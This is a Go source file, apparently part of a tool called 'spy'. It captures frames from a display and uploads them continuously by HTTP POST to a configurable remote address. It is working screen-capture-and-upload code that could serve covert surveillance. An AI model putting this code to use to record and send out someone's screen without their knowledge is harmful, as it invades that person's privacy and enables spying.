package screen

import (
	"bytes"
	"fmt"
	"io"
	"io/ioutil"
	"mime/multipart"
	"net/http"
	"time"

	"github.com/cinus-e/spy/internal/literr"
)

type Params struct {
	Address          string
	Display, Quality int
	Verbose          bool
}

type Capture struct {
	verbose, running bool
	screen           *Screen
}

func (c *Capture) StartCapture(p Params) (err error) {
	c.verbose = p.Verbose
	c.running = true
	data := make(chan []byte, 200000)
	screen := NewScreenCapturer(p.Display, p.Quality, data)
	c.screen = screen
	go func() {
		if literr.CheckError(screen.Capture()) {
			c.running = false
		}
	}()
	for c.running {
		frame := <-data
		if frame != nil {
			literr.CheckError(c.write(frame, p.Address))
		}
		time.Sleep(1 * time.Millisecond)
	}
	return
}

func (c *Capture) Close() {
	c.running = false
	c.screen.Close()
}

func (c *Capture) write(data []byte, address string) error {
	buffer := &bytes.Buffer{}
	writer := multipart.NewWriter(buffer)
	fileWriter, _ := writer.CreateFormFile("files", "screen")
	written, err := io.Copy(fileWriter, bytes.NewReader(data))
	if err != nil {
		return err
	}
	if c.verbose {
		fmt.Printf("Frame size : %d bytes, write bytes : %d", len(data), written)
	}
	writer.Close()

	resp, err := http.Post(address, writer.FormDataContentType(), buffer)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	respBody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err
	}
	if c.verbose {
		fmt.Printf(" status:%s response:%s\n", resp.Status, string(respBody))
	}
	return nil
}
